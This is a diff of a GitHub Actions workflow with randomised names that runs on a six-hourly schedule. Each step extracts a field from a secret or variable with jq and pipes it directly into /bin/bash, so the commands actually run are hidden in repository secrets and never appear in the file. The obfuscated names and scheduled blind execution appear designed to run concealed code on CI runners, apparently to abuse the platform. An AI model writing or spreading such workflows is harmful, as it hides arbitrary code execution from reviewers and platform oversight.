@@ -3,30 +3,28 @@ name: jiyueye4756
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 5/6 * * *'
+    - cron: '20 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jiyueye4756
         env:
-          gcfqt68: ${{ secrets.gcfqt68 }}
+          ojjbo22254: ${{ secrets.ojjbo22254 }}
         run: |
-          echo $gcfqt68 | jq -r .uauqn68 | /bin/bash
-          echo $e5 | jq -r .afvz59 | /bin/bash
-          echo $wnf0404 | jq -r .epuj78 | /bin/bash
-          echo $vwcxd831 | jq -r .v33377 | /bin/bash
-          echo $io63 | jq -r .ws70 | /bin/bash
-          echo $his3983 | jq -r .mvbv0 | /bin/bash
-          echo $dq1 | jq -r .jgsei36 | /bin/bash
-          echo $gda00 | jq -r .bi50 | /bin/bash
-          echo $ng55425 | jq -r .ctfm821 | /bin/bash
-          echo $sgzz4 | jq -r .jma121 | /bin/bash
-          echo $bfv69 | jq -r .xpwge9800 | /bin/bash
-          echo $hnio902 | jq -r .ksuf9 | /bin/bash
-          echo $tzcx0993 | jq -r .te89787 | /bin/bash
-          echo $hjlt838 | jq -r .b09 | /bin/bash
-          echo $jlyg6347 | jq -r .gtme14 | /bin/bash
-          echo $m2 | jq -r .qkmul35210 | /bin/bash
+          echo $ojjbo22254 | jq -r .wlb5 | /bin/bash
+          echo $jua37 | jq -r .s54798 | /bin/bash
+          echo $vs8662 | jq -r .wbpfz9 | /bin/bash
+          echo $m11 | jq -r .bcahq8 | /bin/bash
+          echo $wymqb55 | jq -r .kki60 | /bin/bash
+          echo $j5 | jq -r .pwof269 | /bin/bash
+          echo $gl71163 | jq -r .qrr63298 | /bin/bash
+          echo $baqlk27 | jq -r .v25 | /bin/bash
+          echo $w82 | jq -r .sk96013 | /bin/bash
+          echo $htbb10251 | jq -r .k88191 | /bin/bash
+          echo $tgq7108 | jq -r .ca6 | /bin/bash
+          echo $vsye9091 | jq -r .suxth97187 | /bin/bash
+          echo $jfm0 | jq -r .acsf0 | /bin/bash
 
